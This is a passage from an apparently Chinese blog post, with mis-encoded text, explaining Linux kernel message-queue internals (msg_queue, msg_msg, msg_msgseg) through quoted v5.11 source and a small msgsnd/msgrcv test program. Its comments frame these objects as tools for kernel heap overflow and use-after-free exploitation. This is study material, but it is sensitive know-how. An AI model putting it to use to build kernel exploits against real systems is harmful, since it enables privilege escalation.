class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> queue_id, m_ts_size;</span><br><span class="line">    <span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">    </span><br><span class="line">    m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;</span><br><span class="line">    msgp *message = (msgp *)queue_send_buf;</span><br><span class="line">    message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(message-&gt;mtext,<span class="string">&#x27;\xaa&#x27;</span>, m_ts_size);</span><br><span class="line">    <span class="built_in">memset</span>(queue_recv_buf, <span class="string">&#x27;\xbb&#x27;</span>, <span class="keyword">sizeof</span>(queue_recv_buf));</span><br><span class="line">    </span><br><span class="line">    queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br><span class="line">    get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      
        <h4 id="â‘ åˆ›å»º-3"   >
          <a href="#â‘ åˆ›å»º-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-3" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      
        <h5 id="A-å†…å­˜ç”³è¯·-1"   >
          <a href="#A-å†…å­˜ç”³è¯·-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†…å­˜ç”³è¯·-1" class="headerlink" title="A.å†…å­˜ç”³è¯·"></a>A.å†…å­˜ç”³è¯·</h5>
      <ul>
<li><p>è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»º<code>msg_queue</code>ç»“æ„ä½“ï¼Œä½¿ç”¨<code>msgget</code>å‡½æ•°ï¼Œè°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(key,msg_flag)-&gt;ksys_msgget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newque()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨æœ€åçš„<code>newque()</code>å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä½¿ç”¨<code>kvmalloc()</code>ç”³è¯·å †å—ï¼Œå¤§å°ä¸º0x100ï¼Œå±äº<code>kmalloc-256</code>ï¼Œ(ä¸åŒç‰ˆæœ¬å¤§å°è²Œä¼¼ä¸åŒ)ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¿™ä¸ªæ‰æ˜¯å®é™…ç”³è¯·çš„å †å—å†…å­˜</span></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//è¿›è¡Œç›¸å…³æ³¨å†Œ</span></span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä¸‹é¢ä¸€å †çœ‹ä¸æ‡‚åœ¨å¹²å•¥</span></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="comment">//è¿™äº›ä¸ºä¸€äº›ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­˜æ”¾msg_msgç›¸å…³æŒ‡é’ˆnextã€prev,æ¯”è¾ƒé‡è¦,é€šå¸¸æ‹¿æ¥æº¢å‡ºåˆ¶é€ UAF</span></span><br><span class="line">    <span class="comment">//å’Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„æ‰€æœ‰æ¶ˆæ¯ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>æ¥ç€å½“ä½¿ç”¨<code>msgsnd</code>å‡½æ•°ä¼ é€’æ¶ˆæ¯æ—¶ï¼Œä¼šåˆ›å»ºæ–°çš„<code>msg_msg</code>ç»“æ„ä½“ï¼Œæ¶ˆæ¯è¿‡é•¿çš„è¯å°±ä¼šåˆ›å»ºæ›´å¤šçš„<code>msg_msgseg</code>æ¥å­˜å‚¨æ›´å¤šçš„æ¶ˆæ¯ã€‚ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)-&gt;do_msgsnd()-&gt;load_msg()-&gt;alloc_msg()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨åœ¨<code>alloc_msg()</code>å‡½æ•°</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æœ€å¤§å‘é€DATALEN_MSGé•¿åº¦çš„æ¶ˆæ¯</span></span><br><span class="line">    <span class="comment">//#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„PAGE_SIZEä¸º0x400,å³æœ€å¤škmalloc-</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">    <span class="comment">//ä½¿ç”¨æ­£å¸¸</span></span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¦‚æœä¼ å…¥æ¶ˆæ¯é•¿åº¦è¶…è¿‡0x400-0x30,å°±å†è¿›è¡Œç”³è¯·msg_msgsegã€‚</span></span><br><span class="line">    <span class="comment">//ä½¿ç”¨kmallocç”³è¯·,æ ‡å¿—ä¸ºGFP_KERNEL_ACCOUNTã€‚</span></span><br><span class="line">    <span class="comment">//æœ€å¤§ä¹Ÿä¸º0x400,ä¹Ÿå±äºkmalloc-1024</span></span><br><span class="line">    <span class="comment">//è¿˜æœ‰å†é•¿çš„æ¶ˆæ¯,å°±å†ç”³è¯·msg_msgseg</span></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">		<span class="comment">//ä¸çŸ¥é“å¹²å•¥çš„</span></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="comment">//ç”³è¯·å®Œä¹‹å,å°†msg_msgsegæ”¾åˆ°msg-&gt;nextè¿™ä¸ªå•å‘é“¾è¡¨ä¸Š</span></span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>msg_msg</code>ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¤´éƒ¨å¤§å°<code>0x30</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png" alt="image-20220511220130886" style="zoom:80%;" /></li>
<li><p><code>msg_msgseq</code>ç»“æ„å¦‚ä¸‹ï¼Œåªæ˜¯ä¸€ä¸ª<code>struct msg_msgseg*</code>æŒ‡é’ˆ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png" alt="image-20220511220627775" style="zoom:80%;" /></li>
</ul>
</li>
</ul>

        <h6 id="ç›¸å…³å†…å­˜ç»“æ„ï¼š"   >
          <a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç›¸å…³å†…å­˜ç»“æ„ï¼š" class="headerlink" title="ç›¸å…³å†…å­˜ç»“æ„ï¼š"></a>ç›¸å…³å†…å­˜ç»“æ„ï¼š</h6>
      <p>åœ¨ä¸€ä¸ª<code>msg_queue</code>é˜Ÿåˆ—ä¸‹ï¼Œæ¶ˆæ¯é•¿åº¦ä¸º<code>0x1000-0x30-0x8-0x8-0x8</code></p>
<ul>
<li><p>ä¸€æ¡æ¶ˆæ¯ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png" alt="image-20220511231539231"></p>
</li>
<li><p>ä¸¤æ¡æ¶ˆæ¯ï¼š</p>
<p>ä»¥<code>msg_queue</code>çš„<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="æœªå‘½åæ–‡ä»¶"></p>
</li>
</ul>
<p>åŒç†ï¼ŒåŒä¸€ä¸ª<code>msg_queue</code>æ¶ˆæ¯é˜Ÿåˆ—ä¸‹çš„å¤šæ¡æ¶ˆæ¯ä¹Ÿæ˜¯ç±»ä¼¼çš„</p>

        <h6 id="å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1"   >
          <a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1" class="headerlink" title="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"></a>å†…å­˜ç”³è¯·æ€»ç»“ï¼š</h6>
      <ul>
<li>ä½¿ç”¨<code>msgget()</code>å‡½æ•°åˆ›å»ºå†…æ ¸ç©ºé—´çš„æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„<code>msg_msgseg</code>ï¼Œè¿”å›å€¼ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„<code>id</code>æ ‡å¿—<code>queue_id</code><ul>
<li><code>msg_msgseg</code>ç®¡ç†æ•´ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤§å°ä¸º0x100ï¼Œ<code>kmalloc-256</code>ã€‚</li>
<li>å…¶<code>struct list_head q_messages;</code>åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ<code>msg_msg</code>ç»“æ„çš„<code>struct list_head m_list</code>åŸŸä¸²è”æ‰€æœ‰çš„<code>msg_msg</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨</li>
</ul>
</li>
<li>æ¯æ¬¡åœ¨è¯¥æ¶ˆæ¯é˜Ÿåˆ—<code>queue_id</code>ä¸‹è°ƒç”¨<code>msgsnd()</code>å‡½æ•°éƒ½ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msg</code>ç»“æ„ï¼Œæ¶ˆæ¯é•¿åº¦å¤§äº<code>0x400-0x30</code>å°±ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„<ul>
<li><code>msg_msg</code>ä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼Œä¸<code>msg_queue</code>å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸<code>msg_msgseg</code>å½¢æˆå•å‘é“¾è¡¨å¤§å°æœ€å¤§ä¸º0x400ï¼Œå±äº<code>kmalloc-64</code>è‡³<code>kmalloc-1024</code></li>
<li><code>msg_msgseg</code>ä¹Ÿä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼ŒæŒ‚åœ¨<code>msg_msg</code>å•å‘é“¾è¡¨ä¸­ï¼Œå¤§å°æœ€å¤§ä¸º<code>0x400</code>ï¼Œå±äº<code>kmalloc-16</code>è‡³<code>kmalloc-1024</code>ï¼Œå½“æ¶ˆæ¯é•¿åº¦å¾ˆé•¿æ—¶å°±ä¼šç”³è¯·å¾ˆå¤šçš„å†…æ ¸ç©ºé—´çš„<code>msg_msgseg</code>ç»“æ„ã€‚</li>
</ul>
</li>
</ul>

        <h5 id="B-æ•°æ®å¤åˆ¶-1"   >
          <a href="#B-æ•°æ®å¤åˆ¶-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æ•°æ®å¤åˆ¶-1" class="headerlink" title="B.æ•°æ®å¤åˆ¶"></a>B.æ•°æ®å¤åˆ¶</h5>
      <p>è°ƒç”¨å®Œ<code>alloc_msg()</code>å‡½æ•°åï¼Œå›åˆ°<code>load_msg()</code>å‡½æ•°æ¥ç€è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œå‡½æ•°è¿˜æ˜¯æŒºç®€å•çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å…ˆå¤åˆ¶è¿›msg_msgä¸­å­˜æ”¾æ¶ˆæ¯çš„éƒ¨åˆ†</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> 